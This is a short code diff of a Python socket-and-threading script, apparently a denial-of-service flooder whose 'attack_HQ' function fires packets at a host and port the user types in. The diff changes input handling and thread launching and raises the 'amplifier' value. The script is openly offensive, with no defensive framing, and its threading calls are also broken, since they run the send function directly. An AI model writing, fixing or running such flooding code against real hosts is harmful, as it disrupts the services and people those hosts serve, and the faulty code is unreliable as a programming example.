@@ -2,10 +2,9 @@ import sys
 import socket
 import threading
 
-host = str(sys.argv[1])
-port = int(sys.argv[2])
-
-loops = 10000
+print("Enter Input: ")
+str = input()
+host, port = str.split(' ')
 
 def send_packet(amplifier):
     try:
@@ -17,7 +16,7 @@ def send_packet(amplifier):
     except: return s.close()
 
 def attack_HQ():
-    for sequence in range(loops):
-        threading.Thread(target=send_packet(800), daemon=True).start()
+   threading.Thread(target=send_packet(900), daemon=True).start()
+   threading.Thread(target=send_packet(900), daemon=True).start()
 
 attack_HQ()
